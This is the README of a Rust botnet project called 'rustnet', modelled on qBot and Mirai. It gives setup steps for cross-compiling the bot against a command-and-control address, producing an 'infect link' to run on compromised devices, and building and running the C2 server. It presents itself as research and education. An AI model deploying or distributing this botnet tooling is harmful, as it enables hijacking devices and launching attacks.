# rustnet

Rustnet is a botnet research project developed in Rust and modeled after the qBot and Mirai botnets. The project includes a server-side application and a client-side bot. The server manages connections from both admin users and bots, allowing admins to execute various commands. The client-side bot connects to the server and awaits instructions. It is designed to study the command-and-control and distribution techniques used by IoT botnets in a controlled environment.

This project is a proof of concept and is intended for educational and research purposes only. It must only be used on systems you own or are authorized to test.

## Setup

Install rust and cargo:

```bash
curl https://sh.rustup.rs -sSf | sh
```

Configure current shell:

```bash
source "$HOME/.cargo/env"
```

Install/Configure dependencies and run cross-compilation:

```bash
bash cc7-rust.sh client/ <IP_ADDR> <BOT_PORT>
```

Copy your infect link after cc7-rust.sh completes. This will be the command you run on infected bots.

Add new credential line in `server/admin.txt` in the format of `username:pass`

Build server:

```bash
cd server/ && cargo build --release
```

Run server:

```bash
./target/release/server <ADMIN_PORT> <BOT_PORT>
```
